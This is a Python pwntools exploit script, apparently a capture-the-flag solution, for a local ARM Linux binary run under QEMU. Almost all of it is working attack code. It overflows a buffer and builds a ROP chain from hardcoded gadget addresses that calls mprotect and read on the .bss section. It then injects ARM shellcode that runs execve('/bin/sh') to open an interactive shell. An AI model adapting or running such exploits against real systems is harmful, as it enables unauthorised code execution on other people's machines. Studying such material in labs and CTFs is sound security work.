from pwn import *
context(arch='arm', os='linux', log_level='debug')
r = process(['qemu-arm-static', './arm'])
e = ELF('./arm')

r.recv()
sc = asm('''
    add r0, pc, #12
    mov r1, #0
    mov r2, #0
    mov r7, #11
    svc 0
    .ascii "/bin/sh\\0"
''')

pop_r0_4_lr = 0x521BC
pop_r7_pc = 0x00027d78
pop_r0_pc = 0x5f73c
mprotect_addr = 0x28F10
read_addr = 0x10588

payload = b'a'*0x40+p32(e.bss()+0x44)+p32(pop_r0_pc)+p32(mprotect_addr)+p32(pop_r0_4_lr)+p32(e.bss()) + \
    p32(0x1000)+p32(7)+p32(0)+p32(0)+p32(read_addr)
r.sendline(payload)

payload = sc.ljust(0x44, b'\x00') + p32(e.bss())
r.sendline(payload)
r.interactive()
